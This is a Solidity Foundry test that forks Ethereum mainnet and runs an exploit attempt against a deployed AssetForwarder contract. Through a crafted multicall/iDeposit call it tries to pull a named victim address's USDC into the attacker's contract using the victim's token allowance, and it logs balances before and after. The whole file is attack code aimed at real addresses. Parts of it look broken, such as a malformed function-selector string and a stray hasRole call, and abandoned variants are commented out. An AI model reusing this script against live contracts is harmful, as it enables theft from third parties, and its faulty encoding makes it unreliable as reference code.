// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import {console, Test} from "forge-std/Test.sol";

interface IAssetForwarder {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
    function iDepositUSDC(
        uint256 partnerId,
        bytes32 destChainIdBytes,
        bytes32 recipient,
        uint256 amount
    ) external payable;
    function iDepositInfoUpdate(
        address srcToken,
        uint256 feeAmount,
        uint256 depositId,
        bool initiatewithdrawal
    ) external payable;
}

struct DepositData {
    uint256 partnerId;
    uint256 amount;
    uint256 destAmount;
    address srcToken;
    address refundRecipient;
    bytes32 destChainIdBytes;
}

contract MulticallTest is Test {
    IAssetForwarder assetfor = IAssetForwarder(0xC21e4ebD1d92036Cb467b53fE3258F219d909Eb9);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address private vic = 0x00051d55999c7cd91B17Af7276cbecD647dBC000;
    address private account = 0xB1b64005B11350a94c4D069eff4215592d98F2E2;
    bytes32 pauser = 0x539440820030c4994db4e31b6b800deafd503688728f932addfe7a410515c14c;


    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth", 20771178);
        deal(address(usdc), address(this), 100 ether);
    }

    function testExploit() public {
        emit log_named_uint(
            "balance before exploit:",
            usdc.balanceOf(address(this))
        );

        usdc.approve(address(assetfor), usdc.balanceOf(address(this)));

        uint256 allowance = usdc.allowance(vic, address(assetfor));
        uint256 balance = usdc.balanceOf(vic);
        uint256 amountToTransfer = balance < allowance ? balance : allowance;

        DepositData memory depositData = DepositData({
            partnerId: 1,
            amount: 10,
            destAmount: 10,
            srcToken: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            refundRecipient: address(this),
            destChainIdBytes: 0x3533343335320000000000000000000000000000000000000000000000000000
        });

        
        bytes memory destToken = hex"A0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
        bytes memory recipient = abi.encode(address(this));

        bytes[] memory Data = new bytes[](2);
        Data[0] = abi.encodeWithSelector(
            bytes4(keccak256("hasRole(bytes32,address)")),
            pauser,
            account    // Pass the account as an address
        );

        Data[1] = abi.encodeWithSelector(
            bytes4(keccak256("iDeposit((uint256,uint256,uint256,address,address,bytes32),bytes,bytes)")),
            depositData,
            destToken,
            recipient,
            abi.encodeWithSelector(
            bytes4(keccak256("0x23b872dd(,address,address,uint256)")),
            vic,
            address(this),
            amountToTransfer
        ));

        // uint256 partnerId = 1;
        // bytes32 destChainIdBytes = 0x3533343335320000000000000000000000000000000000000000000000000000;
        // bytes memory recipient2 = abi.encode(address(this));
        // uint256 amount = 10 * 10**6;

        // Data[2] = abi.encodeWithSelector(
        //     bytes4(keccak256("iDepositUSDC(uint256,bytes,bytes,uint256)")), // The selector for the ERC20 `transferFrom(address,address,uint256)` function
        //     partnerId,
        //     destChainIdBytes,
        //     recipient2,
        //     amount
        // );

        // address srctoken = address(usdc);
        // uint256 feeAmount = 20;
        // uint256 partnerIdx = 1;
        // bool initiateWithdrawal;

        // Data[2] = abi.encodeWithSelector(
        //     bytes4(keccak256("iDepositInfoUpdate(address,uint256,uint256,bool)")), // The selector for the ERC20 `transferFrom(address,address,uint256)` function
        //     srctoken,
        //     feeAmount,
        //     partnerIdx,
        //     initiateWithdrawal,
        //     0,
        //     abi.encodeWithSelector(
        //     bytes4(keccak256("safeTransferFrom(address,address,address,uint256)")), // The selector for the ERC20 `transferFrom(address,address,uint256)` function
        //     usdc,
        //     vic,
        //     address(this),
        //     amountToTransfer
        // ));



        IAssetForwarder(assetfor).multicall(Data);

        emit log_named_uint(
            "balance after exploit:",
            usdc.balanceOf(address(this))
        );
    }



}